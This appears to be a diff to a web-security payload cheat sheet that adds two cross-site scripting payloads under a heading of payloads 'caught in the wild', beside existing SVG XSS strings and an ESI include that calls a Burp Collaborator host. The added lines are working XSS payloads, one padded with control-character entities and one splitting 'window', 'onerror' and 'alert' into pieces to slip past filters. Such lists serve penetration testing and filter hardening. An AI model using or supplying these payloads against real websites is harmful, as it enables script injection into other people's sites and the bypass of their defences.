@@ -81,6 +81,8 @@ Some helpful payloads caught in the wild
 <esi:include src="http://abcdef.burpcollaborator.net/" /><script>alert(1)</script>
 <svg><a><rect width=100% height=100% /><animate attributeName=href to=javascript:alert(document.location)>
 <svg><a><animate attributeName=href to=javascript:alert(document.location) /><text y=15>Click me!</text></a>
+<svg><animate xlink:href=#xss attributeName=href alues="&#01;&#02;&#03;&#04;&#05;&#06;&#07;&#08;&#09;&#10;&#11;&#12;&#13;&#14;&#15;&#16;&#17;&#18;&#19;&#20;&#21;&#22;&#23;&#24;&#25;&#26;&#27;&#28;&#29;&#30;&#31;&#32;javascript:alert(1)" /><a id=xss><text x=20 y=20>XSS</text></a>
+<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
 ```
 
 ### XXE  
